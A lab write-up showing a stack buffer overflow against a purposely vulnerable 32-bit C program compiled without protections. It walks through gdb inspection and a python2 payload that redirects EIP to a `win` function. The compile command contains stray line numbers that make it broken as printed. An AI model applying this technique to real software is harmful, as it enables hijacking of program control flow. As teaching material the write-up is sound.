# Buffer Overflow Exploit without Shellcode (Redirection of `EIP`) in 32bit Executable

This example was supplied in https://samsclass.info/127/proj/ED202c.htm

## Compile Code

I compiled the `pwd.c`:

```c title="pwd.c"

#include <stdlib.h>
#include <stdio.h>

int test_pw() {
        char password[10];
        printf("Password address: %p\n", password);
        printf("Enter password: ");
        fgets(password, 50, stdin);
        return 1;
}

void win() {
        printf("You win!\n");
}

void main() {
        if (test_pw()) printf("Fail!\n");
        else win();
}
```


using:

```bash
cc \
    19          -mpreferred-stack-boundary=2 \
    20          -ggdb \
    21          -static \
    22          -m32 \
    23          -no-pie \
    24          -fno-stack-protector \
    25          -z execstack \
    26          -o /tmp/pwd pwd.c
```


## Overflow

Through trial and error, it was found that if we input more than 18 characters, the program crashes:

```bash
python2 -c 'print("U"*18)' | ./pwd
Password address: 0xffffccae
[1]    103844 done                              python2 -c 'print("U"*18)' | 
       103845 segmentation fault (core dumped)  ./pwd
```


## Seeing the Stack

Let's take a look at the stack right after the input. We open the program using `gdb` and look at the instructions for the `test_pw` function:

```
> gdb -q /tmp/pwd

(gdb) disas test_pw 
Dump of assembler code for function test_pw:
   0x08049da5 <+0>:     endbr32 
   0x08049da9 <+4>:     push   %ebp
   0x08049daa <+5>:     mov    %esp,%ebp
   0x08049dac <+7>:     push   %ebx
   0x08049dad <+8>:     sub    $0xc,%esp
   0x08049db0 <+11>:    call   0x8049c80 <__x86.get_pc_thunk.bx>
   0x08049db5 <+16>:    add    $0x9b24b,%ebx
   0x08049dbb <+22>:    lea    -0xe(%ebp),%eax
   0x08049dbe <+25>:    push   %eax
   0x08049dbf <+26>:    lea    -0x30ff8(%ebx),%eax
   0x08049dc5 <+32>:    push   %eax
   0x08049dc6 <+33>:    call   0x8051230 <printf>
   0x08049dcb <+38>:    add    $0x8,%esp
   0x08049dce <+41>:    lea    -0x30fe2(%ebx),%eax
   0x08049dd4 <+47>:    push   %eax
   0x08049dd5 <+48>:    call   0x8051230 <printf>
   0x08049dda <+53>:    add    $0x4,%esp
   0x08049ddd <+56>:    mov    $0x80e5434,%eax
   0x08049de3 <+62>:    mov    (%eax),%eax
   0x08049de5 <+64>:    push   %eax
   0x08049de6 <+65>:    push   $0x32
   0x08049de8 <+67>:    lea    -0xe(%ebp),%eax
   0x08049deb <+70>:    push   %eax
   0x08049dec <+71>:    call   0x8058110 <fgets>
   0x08049df1 <+76>:    add    $0xc,%esp
   0x08049df4 <+79>:    mov    $0x1,%eax
   0x08049df9 <+84>:    mov    -0x4(%ebp),%ebx
   0x08049dfc <+87>:    leave  
   0x08049dfd <+88>:    ret
```

We can see that the instruction right after getting the input from the user (`fgets`) is at byte 76. We put a breakpoint there so we can freeze the program and take a peak at the stack right after we supply the input.

```
(gdb) b * test_pw +76
Breakpoint 1 at 0x8049df1: file pwd.c, line 9.
```

Then we look at the two registers that define the range of the stack, `ESP` (start of stack) and `EBP` (end of stack).

```
(gdb) i r esp
esp            0xffffcc60          0xffffcc60
(gdb) i r ebp
ebp            0xffffcc7c          0xffffcc7c
```

We see that the stack is of size `0x1C` (28 bytes in decimal). Let's a take a look at the next 10 wordsize hex addresses from `ESP`:

```
(gdb) x/10x $esp
0xffffcc60:     0xffffcc6e      0x00000032      0x080e5300      0x55550002
0xffffcc70:     0x55555555      0x55555555      0x55555555      0x55555555
0xffffcc80:     0x0804000a      0x080e5000
```

We can see that our input (`U` is ASCII is `55`) overwrites every up until the `EBP`. So the next 4 characters we supply should be the address where we want the instruction pointer to go. This is how we control the flow of the program.

## Finding Return Address

We want to jump to the first instruction inside the `win` function:

```
(gdb) disas win 
Dump of assembler code for function win:

0x08049dfe <+0>:     endbr32 
0x08049e02 <+4>:     push   %ebp
0x08049e03 <+5>:     mov    %esp,%ebp
0x08049e05 <+7>:     push   %ebx
0x08049e06 <+8>:     call   0x8049e5f <__x86.get_pc_thunk.ax>
0x08049e0b <+13>:    add    $0x9b1f5,%eax
0x08049e10 <+18>:    lea    -0x30fd1(%eax),%edx
0x08049e16 <+24>:    push   %edx
0x08049e17 <+25>:    mov    %eax,%ebx
0x08049e19 <+27>:    call   0x80586f0 <puts>
0x08049e1e <+32>:    add    $0x4,%esp
0x08049e21 <+35>:    nop
0x08049e22 <+36>:    mov    -0x4(%ebp),%ebx
0x08049e25 <+39>:    leave  
0x08049e26 <+40>:    ret    
```

In this case, the address is `0x08049dfe`. We need to convert this address to little Endian form so it will become `\xfe\x9d\x04\x08`. We can use Python to create the payload for us.

## Create Payload with EIP redirection

We create the payload and pipe it into the program `stdin`:

```bash
> python2 -c 'print("UUUUUUUUUUUUUUUUUU\xfe\x9d\x04\x08")' | /tmp/pwd

Password address: 0xffffcdbe
Enter password: You win!
[1]    104775 done                              python2 -c 'print("UUUUUUUUUUUUUUUUUU\xfe\x9d\x04\x08")' | 
       104776 segmentation fault (core dumped)  /tmp/pwd

```

Make sure to use `python2` because `python3` added extra bytes as padding when printing hexadecimal characters as described in [this issue](https://bugs.python.org/issue34437).